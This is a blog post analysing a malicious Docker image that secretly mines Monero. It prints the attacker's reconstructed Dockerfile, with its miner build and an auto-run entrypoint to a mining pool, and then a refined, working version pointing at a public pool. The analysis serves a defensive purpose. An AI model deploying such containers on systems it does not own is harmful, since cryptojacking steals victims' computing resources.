```markdown
# Reverse-Engineering a Malicious Dockerfile  

Ever wondered how a malicious Docker image is built? By reverse-engineering its Dockerfile, we can uncover the attacker's thought process and gain valuable insights into how these images operate. To do this, I used **dfimage**, a tool from GitHub that reconstructs a Dockerfile based on the metadata and structure of an image. While the initial output wasn’t perfect, it provided a solid starting point:  

```dockerfile
FROM ynprpagamentitk/liferay:latest  
ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c in /  
RUN /bin/sh -c set -xe && echo '#!/bin/sh' > /usr/sbin/policy-rc.d && echo 'exit 101' >> /usr/sbin/policy-rc.d  
...
RUN /bin/sh -c git clone https://github.com/OhGodAPet/cpuminer-multi  
RUN /bin/sh -c cd cpuminer-multi && ./autogen.sh && CFLAGS="-march=native" ./configure && make  
WORKDIR /cpuminer-multi  
ADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 in /bin/minerd  
RUN /bin/sh -c chmod 755 /bin/minerd  
ENTRYPOINT ["/bin/minerd", "-a", "cryptonight", "-o", "stratum+tcp://xmr.pool.minergate.com:45560", "-u", "trudly@outlook.com", "-p", "x", "-t", "1"]
```  

At first glance, this Dockerfile raises several red flags. It references a suspicious base image, adds unidentified files, installs dependencies, and compiles a cryptominer (`cpuminer-multi`). The **ENTRYPOINT** ensures that the miner runs automatically, connecting to a mining pool using predefined credentials.  

## Refining the Dockerfile  

To gain a clearer understanding of the image’s construction, I made several refinements:  

1. **Identifying the Base Image**  
   - Using **Docker Scout**, I determined that the base image was actually `ubuntu:xenial-20170510`, rather than the generic reference in the original reconstruction.  
   - I replaced the `FROM ynprpagamentitk/liferay:latest` line with `FROM ubuntu:xenial-20170510` to reflect this.  

2. **Removing Redundant Layers**  
   - The first six layers in the image matched those from the official Ubuntu base image.  
   - Since these layers were standard optimizations, I excluded them from the refined Dockerfile.  

3. **Fixing the Mining Software Installation**  
   - The original Dockerfile referenced a deleted GitHub repository (`OhGodAPet/cpuminer-multi`).  
   - After investigating similar projects, I found that [`tpruvot/cpuminer-multi`](https://github.com/tpruvot/cpuminer-multi) was the correct, actively maintained fork.  
   - I updated the repository reference to ensure that the miner could still be built.  

4. **Simplifying the Build Process**  
   - The original Dockerfile contained multiple redundant `RUN /bin/sh -c` commands.  
   - I streamlined it by combining commands where possible and using more efficient syntax.  

5. **Changing the Mining Pool and Wallet**  
   - The original image mined Monero using an attacker-controlled wallet.  
   - To test the setup in a controlled environment, I replaced the credentials with a random wallet and pointed it to a known mining pool.  

## The Final Reconstructed Dockerfile  

After making these improvements, I arrived at a much cleaner and more functional version of the Dockerfile:  

```dockerfile
FROM ubuntu:xenial-20170510  

RUN apt-get update -qq && apt-get install -qqy \  
    git automake autoconf pkg-config \  
    libcurl4-openssl-dev libjansson-dev libssl-dev \  
    libgmp-dev zlib1g-dev make g++  

RUN git clone https://github.com/tpruvot/cpuminer-multi  
RUN cd cpuminer-multi && ./build.sh  

ENTRYPOINT ["/cpuminer-multi/cpuminer", "-a", "cryptonight", "-o",  
    "stratum+tcp://pool.supportxmr.com:3333", "-u", "[random monero wallet]", "-p", "x", "-t", "1"]
```  

## Key Takeaways  

- **Attackers use misleading base images** to disguise their intent.  
- **Automated tools like `dfimage` help reconstruct a Dockerfile**, but manual refinements are necessary.  
- **Comparing layers with a known base image** helps separate legitimate system optimizations from potential malware.  
- **Mining software repositories can disappear**, so identifying active forks is crucial for accurate analysis.  
- **Cryptojacking containers automate execution**, ensuring that the miner runs as soon as the container starts.  

By reverse-engineering this Dockerfile, I was able to fully understand how the malicious container was designed and how attackers efficiently integrate cryptominers into Docker environments. This method can be applied to other suspicious images to dissect their behavior and improve security defenses.